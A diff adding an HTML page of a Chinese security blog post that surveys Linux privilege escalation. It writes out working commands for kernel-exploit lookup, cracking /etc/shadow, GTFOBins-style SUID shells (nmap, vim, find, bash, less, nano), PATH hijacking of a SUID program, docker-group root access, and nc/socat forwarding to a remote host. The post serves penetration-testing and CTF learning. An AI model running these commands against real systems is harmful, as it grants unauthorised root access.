@@ -1,0 +1,1307 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PRACTICE,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="稍微总结了一下关于 Linux 提权的小知识">
+<meta name="keywords" content="PRACTICE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权小知识">
+<meta property="og:url" content="https://tyaoo.github.io/2020/05/27/Linux提权小知识/index.html">
+<meta property="og:site_name" content="Tyaoo&#39;s Blog">
+<meta property="og:description" content="稍微总结了一下关于 Linux 提权的小知识">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527180236.png">
+<meta property="og:updated_time" content="2020-05-27T14:10:31.293Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux提权小知识">
+<meta name="twitter:description" content="稍微总结了一下关于 Linux 提权的小知识">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527180236.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://tyaoo.github.io/2020/05/27/Linux提权小知识/">
+
+
+
+
+
+  <title>Linux提权小知识 | Tyaoo's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tyaoo's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://tyaoo.github.io/2020/05/27/Linux提权小知识/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tyaoo">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tyaoo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux提权小知识</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-27T22:09:24+08:00">
+                2020-05-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>稍微总结了一下关于 Linux 提权的小知识</p>
+<a id="more"></a>
+
+<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>查看发行版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
+
+<p>查看内核版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p>大多内核漏洞通过内核版本能很快查到</p>
+<p>用 kali 自带的 searchsploit 来搜索 exploitdb 中的漏洞利用代码</p>
+<blockquote>
+<p>根据自己的搜索结果，增加搜索选项，缩小结果范围</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchspoit priv esc linux 2.6 ubuntu</span><br></pre></td></tr></table></figure>
+
+<p>利用第三方工具搜集信息</p>
+<p><a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener">linux-exploit-suggester</a></p>
+<blockquote>
+<p>Linux_Exploit_Suggester 能够列举出给定内核在每个公开的Linux内核漏洞上的暴露情况。</p>
+<p>Example：</p>
+<p>./linux-exploit-suggester.sh –uname <uname-string></uname-string></p>
+</blockquote>
+<p><a href="https://github.com/jondonas/linux-exploit-suggester-2" target="_blank" rel="noopener">linux-exploit-suggester-2</a></p>
+<blockquote>
+<p>Linux_Exploit_Suggester 是一款根据操作系统版本号自动查找相应提权脚本的工具，如果不带任何参数运行该脚本的话，将执行 uname -r 返回的操作系统发行版本，或者手工输入-k 参数查找指定版本号</p>
+<p>Example:</p>
+<p>perl ./Linux_Exploit_Suggester.pl -k 3.0.0</p>
+</blockquote>
+<p><a href="https://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="noopener">linuxprivchecker</a></p>
+<blockquote>
+<p>Linuxprivchecker 本地执行，可以列举出基本的系统信息并搜索常见的提权信息，如普通用户可写文件，错误配置，明文密码和可用的 exp。</p>
+<p>Example：</p>
+<p>python Linuxprivchecker.py</p>
+</blockquote>
+<p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a></p>
+<blockquote>
+<p>LinEnum 可以列出详细的各种系统、文件和服务信息，定位出可能存在提权的地方，与上面的 linuxprivchecker 类似</p>
+<p>Example：</p>
+<p>./LinEnum.sh -r report -e /tmp/ -t</p>
+</blockquote>
+<p>当内核版本没有好用的exp对应的时候，可以检查磁盘格式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>
+
+<p>和已经安装的程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br></pre></td></tr></table></figure>
+
+<h2 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h2><p>大多 linux 系统的密码都和 /etc/passwd 和 /etc/shadow 这两个配置文件息息相关。passwd 里面存储了用户，shadow 里面存储了密码的 hash</p>
+<p>出于安全考虑 passwd 是全用户可读，root可写的，而 shadow 是仅 root 可读写的</p>
+<p><strong>检查文件权限</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">ls -l passwd shadow</span><br></pre></td></tr></table></figure>
+
+<p><strong>/etc/passwd 可写</strong></p>
+<p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了</p>
+<p>如果 passwd 可写，我们就可以把 root 的密码字段替换成一个已知密码的 hash，这样系统在验证密码时以 passwd 的为准</p>
+<p><strong>/etc/shadow 可读</strong></p>
+<p>如果shadow可读，我们可以读走 root 的 hash，然后用 hashcat 或者 john 暴力破解。</p>
+<p><strong>启动终端</strong></p>
+<p>出于安全考虑，linux 要求用户必须从<strong>终端设备</strong>（tty）中输入密码，而不是标准输入（stdin）。换句话说，sudo 在你输入密码的时候本质上是读取了键盘，而不是 bash 里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。我们可以利用 python 启动一个终端</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/sh")'</span><br></pre></td></tr></table></figure>
+
+<p>就用 python 建立了一个虚拟终端，然后就可以使用 sudo 等等命令了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/sh")'</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo su</span></span><br><span class="line">[sudo] password for ctf: </span><br><span class="line">Sorry, try again.</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-滥用"><a href="#sudo-滥用" class="headerlink" title="sudo 滥用"></a>sudo 滥用</h2><p>sudo 是让普通用户使用超级用户的命令，其配置文件为 /etc/sudoers，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p>
+<p>利用 <code>sudo -l</code> 查看当前用户可使用的 sudo 命令</p>
+<p>然后我们可以参考 <a href="https://gtfobins.github.io" target="_blank" rel="noopener">https://gtfobins.github.io</a> 进行提权</p>
+<blockquote>
+<p>强烈推荐此博客，它整理了 Unix 内部可用于绕过本地安全限制的二进制文件</p>
+</blockquote>
+<h2 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h2><p>系统内可能会有一些定时执行的任务，一般这些任务由 crontab 来管理，具有所属用户的权限。非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc 内系统的计划任务可以被列出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br></pre></td></tr></table></figure>
+
+<p>默认这些程序以 root 权限执行，如果有幸遇到其中一个脚本被配置成任意用户可写，我们就可以修改脚本等反弹 root shell。</p>
+<blockquote>
+<p>rontab 计划任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p>
+</blockquote>
+<h2 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h2><p>SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行。比如 passwd 命令，就是以 root 权限运行来修改 shadow 的。</p>
+<blockquote>
+<p>注意：只有这个程序的所有者是 0 号或其他 super user，同时拥有 SUID　权限，才可以提权。</p>
+<p>参考：<a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p>
+</blockquote>
+<p>命令行查找 SUID 文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里举一个例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>); <span class="comment">// 以root用户执行</span></span><br><span class="line">    system(<span class="string">"id"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以 root 进行编译和权限设置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc pri.c -o pri</span><br><span class="line">chmod u+s ./pri # 这里设置了SUID位</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">total 24</span><br><span class="line">-rwsr-xr-x 1 root root 16616 May 27 05:59 pri</span><br><span class="line">-rw-r--r-- 1 root root    95 May 27 05:57 pri.c</span><br></pre></td></tr></table></figure>
+
+<p>注意 s 属性，表示这个程序有 SUID 属性。</p>
+<p>接下来我们切换用户并执行可以发现提权成功</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su ctf</span><br><span class="line">./pri</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527180236.png" alt="image-20200527180232737"></p>
+<p>而除了借助程序功能提权，我们还可以尝试劫持环境变量提权。上文的 pri 程序使用了 system 函数，system 函数是继承环境变量的，因此我们通过替换环境变量可以达到执行任意命令的效果。</p>
+<p>继续以上面的 pri 程序为例，我们来尝试劫持 id 命令，修改环境变量路径</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法一</strong></p>
+<p>修改 id 命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo '/bin/sh' &gt; /tmp/id</span><br><span class="line">chmod 777 /tmp/id</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二</strong></p>
+<p>直接复制一个 bash</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/sh /tmp/id</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法三</strong></p>
+<p>建立一个软链接（需要一定的权限）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /bin/sh /tmp/id</span><br><span class="line">export PATH=.:$PATH</span><br></pre></td></tr></table></figure>
+
+<p>运行程序提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./pri</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+
+<p>这里列出一些常用的可用于 SUID 提权的文件</p>
+<blockquote>
+<p>这里我们也可以再次借鉴神博客 <a href="https://gtfobins.github.io" target="_blank" rel="noopener">https://gtfobins.github.io</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- nmap</span><br><span class="line">- Vim</span><br><span class="line">- find</span><br><span class="line">- bash</span><br><span class="line">- more</span><br><span class="line">- less</span><br><span class="line">- nano</span><br><span class="line">- cp</span><br></pre></td></tr></table></figure>
+
+<p><strong>namp</strong></p>
+<p>较旧版本的 Nmap（2.02~5.21）带有交互模式，从而允许用户执行 shell 命令。由于 Nmap 位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。</p>
+<p>可以使用下命令进入namp交互模式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
+
+<p>执行命令后会返回一个shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">nmap&gt;</span><span class="bash"> !sh</span></span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>而在 Metasploit 中也有一个模块可以通过 SUID nmap 进行提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/local/setuid_nmap</span><br></pre></td></tr></table></figure>
+
+<p><strong>vim</strong></p>
+<p>Vim 的主要用途是用作文本编辑器。 但是，如果以 SUID 运行，它将继承 root 用户的权限，因此可以读取系统上的所有文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p><strong>find</strong></p>
+<p>如果 find 以 SUID 权限运行，所有通过 find 执行的命令都会以 root 权限运行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></table></figure>
+
+<p><strong>bash</strong></p>
+<p>以下命令将以 root 身份打开一个 bash shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line">uid=500(cow) gid=500(cow) euid=0(root) groups=500(cow)</span><br></pre></td></tr></table></figure>
+
+<p><strong>less</strong></p>
+<p>程序 less 也可以执行提权后的 shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><strong>nano</strong></p>
+<p>以下命令可以打开一个提权后的 shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./nano</span><br><span class="line">^R^X</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+<p><strong>cp</strong></p>
+<p>写文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LFILE=file_to_write</span><br><span class="line">echo "DATA" | ./cp /dev/stdin "$LFILE"</span><br></pre></td></tr></table></figure>
+
+<p>执行命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LFILE=file_to_write</span><br><span class="line">TF=$(mktemp)</span><br><span class="line">echo "DATA" &gt; $TF</span><br><span class="line">./cp $TF $LFILE</span><br></pre></td></tr></table></figure>
+
+<h2 id="Docker-组提权"><a href="#Docker-组提权" class="headerlink" title="Docker 组提权"></a>Docker 组提权</h2><p>docker 组用户提权，目的是利用 docker 组的用户来提权，因为 docker 组用户在容器下为 root 权限，通过挂载方式在容器下给本机添加 sudo 权限的用户，从而可以利用 sudo 命令。</p>
+<p>参考 <a href="https://fosterelli.co/privilege-escalation-via-docker.html" target="_blank" rel="noopener">https://fosterelli.co/privilege-escalation-via-docker.html</a></p>
+<p>普通用户执行这条命令就可以获得root权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure>
+
+<p>如果没有拥有 sudo 权限的用户，是无法执行 sudo 命令，在 kali 下会提示用户不在 sudoers 等提示。 </p>
+<h2 id="服务漏洞"><a href="#服务漏洞" class="headerlink" title="服务漏洞"></a>服务漏洞</h2><p>有一些服务器的服务会被配置成对内网或者对本机开放。通过对他们的攻击我们有机会接触更多的敏感文件，或是运气足够好碰上一个远程 root 漏洞。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antup # 查看各种网络服务</span><br></pre></td></tr></table></figure>
+
+<p>如果找到些神秘的服务，可以用 netcat 或者 socat 等工具做端口转发</p>
+<p>nc 单向转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8080 | nc remote_host 4444</span><br></pre></td></tr></table></figure>
+
+<p>nc 双向转发</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo backpipe nc -l 8080 0&lt;backpipe | nc remote_host 4444 1&gt;backpipe</span><br></pre></td></tr></table></figure>
+
+<p>socat tcp 转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -d TCP4-LISTEN:80,reuseaddr,fork TCP4:remote_host:4444</span><br></pre></td></tr></table></figure>
+
+<p>socat udp 转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -T 600 UDP4-LISTEN:5353,reuseaddr,fork UDP4:remote_host:4444</span><br></pre></td></tr></table></figure>
+
+<p>常见服务漏洞</p>
+<ul>
+<li>redis</li>
+<li>mysql</li>
+<li>mssql</li>
+<li>nfs</li>
+</ul>
+<p><strong>参考资料</strong></p>
+<p><a href="https://www.freebuf.com/articles/system/129549.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/129549.html</a></p>
+<p><a href="http://zone.secevery.com/article/1104" target="_blank" rel="noopener">http://zone.secevery.com/article/1104</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1544037" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1544037</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------------本文结束 <i class="fa fa-heart"></i> 感谢阅读-------------------</div>
+    
+</div>
+      
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PRACTICE/" rel="tag"># PRACTICE</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/26/BUUCTF-2/" rel="next" title="BUUCTF-2">
+                <i class="fa fa-chevron-left"></i> BUUCTF-2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/28/2020-GKCTF-Web/" rel="prev" title="2020-GKCTF-WEB">
+                2020-GKCTF-WEB <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Tyaoo">
+            
+              <p class="site-author-name" itemprop="name">Tyaoo</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Tyaoo" target="_blank" title="GitHub">
+                      
